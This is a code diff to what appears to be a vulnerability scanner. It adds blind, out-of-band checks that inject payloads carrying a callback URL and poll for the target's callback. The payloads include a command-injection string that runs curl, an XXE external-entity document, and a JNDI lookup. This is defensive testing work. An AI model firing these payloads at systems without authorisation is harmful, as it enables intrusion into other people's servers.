@@ -23,10 +23,12 @@ tokens), not weaponized exploits.
 
 from __future__ import annotations
 
+import time
 from dataclasses import dataclass
-from typing import Callable, Protocol, runtime_checkable
+from typing import Callable, ClassVar, Protocol, runtime_checkable
 
 from ..verify.adapter import FindingContext
+from ..verify.oob import OOBReceiver
 from .insertion import HttpRequest, InsertionPoint, RequestTemplate
 
 # A `send` turns a rendered request into an observed response dict
@@ -93,6 +95,47 @@ class MarkerReflectionCheck:
         return FindingContext.from_side_effect(marker, body, bug_class=self.bug_class)
 
 
+@dataclass(frozen=True)
+class OOBCheck:
+    """Out-of-band (blind) check: mint a unique correlation token, embed its
+    loopback callback URL into a payload, inject it, and poll the receiver for
+    an inbound interaction. The proof is the *callback the target makes*, not
+    anything in the response — so this reaches the blind classes (SSRF, blind
+    XXE, OOB SQLi, deserialization/JNDI gadgets) that leave no visible signal.
+
+    ``payload_template`` must contain ``{callback}``. Polling is deadline-bounded
+    with a small interval so a DEFERRED interaction (a callback that lands after
+    the injecting request returns) is still caught — the case a single one-shot
+    poll misses. Distinguished from response-based checks by ``wants_oob``; the
+    engine hands it the receiver."""
+
+    id: str
+    bug_class: str
+    payload_template: str = "{callback}"
+    poll_deadline: float = 2.0
+    poll_interval: float = 0.05
+
+    wants_oob: ClassVar[bool] = True
+
+    def probe(
+        self, template: RequestTemplate, point: InsertionPoint, send: Send, oob: OOBReceiver
+    ) -> FindingContext | None:
+        token, callback_url = oob.register_token()
+        payload = self.payload_template.format(callback=callback_url)
+        try:
+            send(template.render(point, payload))
+        except Exception:
+            # A blind payload may make the target error its own response; the
+            # callback — not the response — is the signal, so keep waiting for it.
+            pass
+        deadline = time.monotonic() + self.poll_deadline
+        hits = oob.poll(token)
+        while not hits and time.monotonic() < deadline:
+            time.sleep(self.poll_interval)
+            hits = oob.poll(token)
+        return FindingContext.from_oob(hits, bug_class=self.bug_class)
+
+
 def _slugify(s: str) -> str:
     return "".join(c for c in s if c.isalnum())
 
@@ -132,13 +175,49 @@ ERROR_BASED = MarkerReflectionCheck(
 )
 
 
+# --- out-of-band (blind) checks: confirmed by a callback, not a response ----
+
+SSRF_OOB = OOBCheck(
+    id="ssrf-oob", bug_class="ssrf",
+    # a bare callback URL: a server-side fetch of it is the interaction
+    payload_template="{callback}",
+)
+
+XXE_OOB = OOBCheck(
+    id="xxe-oob", bug_class="blind_xxe",
+    # external general entity that dereferences the callback on parse
+    payload_template=(
+        "<?xml version=\"1.0\"?>"
+        "<!DOCTYPE r [<!ENTITY x SYSTEM \"{callback}\">]><r>&x;</r>"
+    ),
+)
+
+RCE_OOB = OOBCheck(
+    id="rce-oob", bug_class="command_injection",
+    # a command-injection break-out that curls the callback (blind OS cmdi)
+    payload_template=";curl {callback};",
+)
+
+DESERIALIZATION_OOB = OOBCheck(
+    id="deserialization-oob", bug_class="deserialization",
+    # JNDI/log4shell-style lookup: dereferenced during unsafe deserialization
+    payload_template="${{jndi:ldap://{callback}}}",
+)
+
+
 DEFAULT_CHECKS: tuple[Check, ...] = (
     BOOLEAN_SQLI,
     REFLECTED_XSS,
     SSTI_REFLECTION,
     PATH_TRAVERSAL,
     ERROR_BASED,
+    SSRF_OOB,
+    XXE_OOB,
+    RCE_OOB,
+    DESERIALIZATION_OOB,
 )
 """A ready-to-run seed set. Every check maps to a bug_class the verifier already
-routes to an oracle, so it confirms end-to-end. Extend by declaring more
-DifferentialCheck / MarkerReflectionCheck entries — no new oracle needed."""
+routes to an oracle, so it confirms end-to-end. The OOB checks (`wants_oob`) run
+only when the engine has an OOBReceiver — without one they are skipped, never
+guessed. Extend by declaring more DifferentialCheck / MarkerReflectionCheck /
+OOBCheck entries — no new oracle needed."""
